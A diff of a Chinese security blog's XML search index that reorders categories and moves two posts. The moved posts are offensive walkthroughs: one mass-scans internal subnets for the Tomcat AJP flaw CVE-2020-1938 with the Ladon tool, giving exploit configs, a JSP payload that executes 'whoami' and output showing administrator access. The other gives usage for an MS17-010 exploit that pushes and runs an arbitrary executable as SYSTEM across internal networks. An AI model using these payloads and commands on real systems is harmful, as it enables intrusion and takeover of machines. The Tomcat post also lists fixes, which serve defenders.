@@ -697,8 +697,8 @@
 <h3 id="注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善"><a href="#注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善" class="headerlink" title="注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善"></a>注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善</h3><h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a><a href="#readme">Top</a></h4>]]></content>
       <categories>
         <category>工具</category>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
         <category>内网</category>
       </categories>
       <tags>
@@ -942,8 +942,8 @@
 <h3 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h3><p>暂时只支持JspShell，有空再添加其它SHELL</p>
 ]]></content>
       <categories>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1530,8 +1530,8 @@
 <h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>
 ]]></content>
       <categories>
-        <category>Cobalt Strike</category>
         <category>Ladon</category>
+        <category>Cobalt Strike</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -1786,6 +1786,42 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
+    <url>/p/42879.html</url>
+    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
+<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
+<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
+<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
+<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
+<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
+<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
+<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
+<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
+<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Ladon</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
     <url>/p/40523.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p>
@@ -1822,42 +1858,6 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <tags>
         <tag>Cobalt Strike</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
-    <url>/p/42879.html</url>
-    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
-<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
-<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
-<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
-<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
-<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
-<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
-<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
-<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
-<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
-]]></content>
-      <categories>
-        <category>Ladon</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -3173,34 +3173,6 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>SMB</tag>
-        <tag>MS17010</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
     <url>/p/19452dd9.html</url>
     <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
@@ -3356,6 +3328,34 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>SMB</tag>
+        <tag>MS17010</tag>
       </tags>
   </entry>
   <entry>
